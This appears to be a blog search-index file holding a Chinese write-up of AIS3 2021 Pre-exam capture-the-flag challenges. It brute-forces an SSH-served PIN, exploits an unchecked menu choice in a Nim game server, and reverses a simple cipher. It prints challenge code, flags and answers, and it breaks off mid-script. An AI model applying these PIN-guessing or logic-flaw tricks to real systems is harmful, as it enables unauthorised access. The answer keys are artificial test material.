<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021 AIS3 Pre-exam write-up</title>
      <link href="/2021/05/24/2021-AIS3-Pre-exam-write-up/"/>
      <url>/2021/05/24/2021-AIS3-Pre-exam-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><table><thead><tr><th>ID</th><th>gunjyo</th></tr></thead><tbody><tr><td>Date</td><td>2021/05/22 10:00 - 2021/05/24 17:30</td></tr><tr><td>Rank</td><td>61(正取 AIS3)</td></tr><tr><td>Score</td><td>1346</td></tr></tbody></table><p>這是我第一次參加 AIS3 Pre-exam，最終成績是 61 名，過程中運氣好有上去到 43 名，對我來說覺得還不錯&gt;&lt;<br>剛好落在錄取的 75 名內，萬幸~<br>隔年應該會因為準備大學而無法參加，希望後年能夠拿到更好的成績~<br><img src="https://i.imgur.com/OG8f5z5.jpg" alt="AIS3 rank"></p><p>事不遲疑，直接進到 write-up 吧</p><blockquote><p>註 有些題目跟 MFC 是重疊的哦~ write-up 是一致的</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi-100"><a href="#Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi-100" class="headerlink" title="Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi (100)"></a>Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi (100)</h3><blockquote><p>BGM: <a href="https://youtu.be/9-NusuQ8JaA">https://youtu.be/9-NusuQ8JaA</a><br>TERM=xterm-256color ssh -p 5566 <a href="mailto:h173@quiz.ais3.org">h173@quiz.ais3.org</a><br>[name= Author: splitline feat. Hojo Satoko]</p></blockquote><p>Welcome 題</p><p><code>TERM=xterm-256color ssh -p 5566 h173@quiz.ais3.org</code><br>連線後會跳轉到輸入數字密碼的介面，只要按錯一個就會跳 Locked，要重新連線<br>暴力嘗試即可<br>密碼 2025830455298</p><blockquote><p>flag <code>AIS3{H1n4m1z4w4_Sh0k0gun}</code></p></blockquote><blockquote><p>HINT 附上了<a href="https://youtu.be/2b3Oqo13-r0?t=1296">影片</a></p></blockquote><h3 id="Microcheese-141"><a href="#Microcheese-141" class="headerlink" title="Microcheese(141)"></a>Microcheese(141)</h3><p>是一個撿石頭遊戲，玩家和電腦輪流選任一排的任意數目的石子，將它們移去，最後清空盤面的獲勝。<br><img src="https://i.imgur.com/bi7g9ec.png" alt="Chess"></p><div class="spoiler collapsed">    <div class="spoiler-title">        game.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> typing <span class="token keyword">import</span> Tuple<span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    a simple Nim game with normal rules.    grundy's theorem: if nim_sum() is zero, then the player to move has a    winning strategy. otherwise, the other player has a winning strategy.    '''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">generate_winning_game</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''generate a game such that the first player has a winning strategy'''</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        xor_sum <span class="token operator">=</span> <span class="token number">0</span>        piles <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>piles<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>count <span class="token punctuation">:</span><span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            xor_sum <span class="token operator">^</span><span class="token operator">=</span> count        <span class="token keyword">if</span> xor_sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">generate_losing_game</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''generate a game such that the second player has a winning strategy'''</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        xor_sum <span class="token operator">=</span> <span class="token number">0</span>        piles <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>piles<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>count <span class="token punctuation">:</span><span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            xor_sum <span class="token operator">^</span><span class="token operator">=</span> count        <span class="token keyword">if</span> xor_sum <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xor_sum<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">make_move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pile<span class="token punctuation">:</span> int<span class="token punctuation">,</span> count<span class="token punctuation">:</span> int<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''makes a move, returns whether the move is legal'''</span>        <span class="token keyword">if</span> pile <span class="token operator">not</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> count <span class="token operator">not</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        self<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span> <span class="token operator">-=</span> count        <span class="token keyword">if</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>pile<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">nim_sum</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> int<span class="token punctuation">:</span>        xor_sum <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> count <span class="token keyword">in</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">:</span>            xor_sum <span class="token operator">^</span><span class="token operator">=</span> count        <span class="token keyword">return</span> xor_sum    <span class="token keyword">def</span> <span class="token function">ended</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        checks if the game has ended, i.e., the player has no more moves.        if True, the current player loses the game        '''</span>        <span class="token keyword">return</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+---+-------------- stones info ------------------+'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> pile<span class="token punctuation">,</span> count <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'| {pile} | {"o" * count:&lt;43} |'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> game_str<span class="token punctuation">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''loads a saved game from string'''</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> list<span class="token punctuation">(</span>map<span class="token punctuation">(</span>int<span class="token punctuation">,</span> game_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">save</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''returns the current game as a string'''</span>        <span class="token keyword">return</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">AIPlayer</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    a perfect Nim player. if there exists a winning strategy for a game, this    player will always win.    '''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">get_move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> game<span class="token punctuation">:</span> Game<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        if there is a winning strategy, returns a move that guarantees a win.        otherwise, returns a random move.        '''</span>        nim_sum <span class="token operator">=</span> game<span class="token punctuation">.</span>nim_sum<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> nim_sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># losing game, make a random move</span>            pile <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>game<span class="token punctuation">.</span>stones<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            count <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> game<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># winning game, make a winning move</span>            <span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>game<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">:</span>                target <span class="token operator">=</span> v <span class="token operator">^</span> nim_sum                <span class="token keyword">if</span> target <span class="token operator">&lt;</span> v<span class="token punctuation">:</span>                    pile <span class="token operator">=</span> i                    count <span class="token operator">=</span> v <span class="token operator">-</span> target                    <span class="token keyword">break</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>pile<span class="token punctuation">,</span> count<span class="token punctuation">)</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        server.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> myhash<span class="token keyword">from</span> game <span class="token keyword">import</span> Game<span class="token punctuation">,</span> AIPlayer<span class="token keyword">from</span> text <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">'(no flag here)'</span>hash <span class="token operator">=</span> myhash<span class="token punctuation">.</span>Hash<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">play</span><span class="token punctuation">(</span>game<span class="token punctuation">:</span> Game<span class="token punctuation">)</span><span class="token punctuation">:</span>    ai_player <span class="token operator">=</span> AIPlayer<span class="token punctuation">(</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">while</span> <span class="token operator">not</span> game<span class="token punctuation">.</span>ended<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        game<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>        print_game_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>        choice <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'it\'s your turn to move! what do you choose? '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>            pile <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">'which pile do you choose? '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            count <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">'how many stones do you remove? '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> game<span class="token punctuation">.</span>make_move<span class="token punctuation">(</span>pile<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">:</span>                print_error<span class="token punctuation">(</span><span class="token string">'that is not a valid move!'</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>        <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            game_str <span class="token operator">=</span> game<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>            digest <span class="token operator">=</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span>game_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'you game has been saved! here is your saved game:'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>game_str <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> digest<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment" spellcheck="true"># no move -> player wins!</span>        <span class="token keyword">if</span> game<span class="token punctuation">.</span>ended<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            win <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            print_move<span class="token punctuation">(</span><span class="token string">'you'</span><span class="token punctuation">,</span> count<span class="token punctuation">,</span> pile<span class="token punctuation">)</span>            game<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># the AI plays a move</span>        pile<span class="token punctuation">,</span> count <span class="token operator">=</span> ai_player<span class="token punctuation">.</span>get_move<span class="token punctuation">(</span>game<span class="token punctuation">)</span>        <span class="token keyword">assert</span> game<span class="token punctuation">.</span>make_move<span class="token punctuation">(</span>pile<span class="token punctuation">,</span> count<span class="token punctuation">)</span>        print_move<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> count<span class="token punctuation">,</span> pile<span class="token punctuation">)</span>    <span class="token keyword">if</span> win<span class="token punctuation">:</span>        print_flag<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        print_lose<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    print_main_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>    choice <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'what would you like to do? '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>        print_rules<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        game <span class="token operator">=</span> Game<span class="token punctuation">(</span><span class="token punctuation">)</span>        game<span class="token punctuation">.</span>generate_losing_game<span class="token punctuation">(</span><span class="token punctuation">)</span>        play<span class="token punctuation">(</span>game<span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        saved <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'enter the saved game: '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        game_str<span class="token punctuation">,</span> digest <span class="token operator">=</span> saved<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span>game_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> digest<span class="token punctuation">:</span>            game <span class="token operator">=</span> Game<span class="token punctuation">(</span><span class="token punctuation">)</span>            game<span class="token punctuation">.</span>load<span class="token punctuation">(</span>game_str<span class="token punctuation">)</span>            play<span class="token punctuation">(</span>game<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            print_error<span class="token punctuation">(</span><span class="token string">'invalid game provided!'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'omg bye!'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    print_welcome<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            menu<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'oops i died'</span><span class="token punctuation">)</span></code></pre>    </div></div><p>從 <code>game.py</code> 的規則可以看到有先手贏的棋盤(<code>generate_winning_game()</code>)和後手贏的棋盤(<code>generate_losing_game()</code>)，我是先手，所以 SERVER 會給後手贏的棋盤，理論上來說應該贏不了。<br><img src="https://i.imgur.com/3KslZMz.png" alt="play()"><br>但問題出在 <code>server.py</code> 中的 <code>play()</code>，只有判斷 <code>choice</code> 為 0,1,2 的狀況，因此若我們輸入非 0,1,2 的數字便可跳過回合，直到剩下最後一排為止，便可以獲勝得到 flag<br><img src="https://i.imgur.com/9OAfNm9.png" alt="win"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Microchip-102"><a href="#Microchip-102" class="headerlink" title="Microchip(102)"></a>Microchip(102)</h3><blockquote><p>Author: toxicpie</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        整理後的題目如下    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#include "python.h"</span><span class="token keyword">def</span> <span class="token function">track</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"4444"</span>                                                      <span class="token keyword">elif</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"333"</span>                                                       <span class="token keyword">elif</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"22"</span>                                                        <span class="token keyword">elif</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"1"</span>    keys <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> id    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> int<span class="token punctuation">(</span>temp <span class="token operator">/</span> <span class="token number">96</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>padded<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#10 round</span>        nums <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>            num <span class="token operator">=</span> ord<span class="token punctuation">(</span>padded<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span>            num <span class="token operator">=</span> <span class="token punctuation">(</span>num <span class="token operator">+</span> keys<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span>            nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result  <span class="token comment" spellcheck="true">#len -> 40</span>name <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>id <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"key = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result is:"</span><span class="token punctuation">,</span> track<span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> </code></pre>    </div></div><p>output： <code>=Js&amp;;*A``odZHi\'&gt;D=Js&amp;#i-DYf&gt;Uy\'yuyfyu&lt;)Gu</code><br>把 FLAG 每四個字就翻轉，接著加上 key 後 mod 96，再加上 32 後取字元值，就會得到 output<br>只要有 key 就可以用 result 逆推回 flag<br>由於我們知道 flag format = <code>AIS3{printable}</code>，因此利用<code>AIS3</code>就可以輕易逆推 key<br>4 個而已慢慢用手推即可</p><div class="spoiler collapsed">    <div class="spoiler-title">        推 key    </div>    <div class="spoiler-content">        <p>把 <code>result</code> 推回陣列(如下script)，取前四個數字(6,83,42,29)</p><pre class=" language-cpp"><code class="language-cpp"><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">33</span><span class="token punctuation">(</span> <span class="token number">33</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">41</span><span class="token punctuation">(</span> <span class="token number">41</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">83</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">51</span><span class="token punctuation">(</span> <span class="token number">51</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">42</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">19</span><span class="token punctuation">(</span> <span class="token number">19</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">29</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>key<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span></code></pre>    </div></div><p>接著把 <code>result</code> 依據 key 逆推回去即可<br><strong>script</strong></p><pre class=" language-cpp"><code class="language-cpp">result <span class="token operator">=</span> <span class="token string">'=Js&amp;;*A`odZHi\'>D=Js&amp;#i-DYf>Uy\'yuyfyu&lt;)Gu'</span>n <span class="token operator">=</span> <span class="token 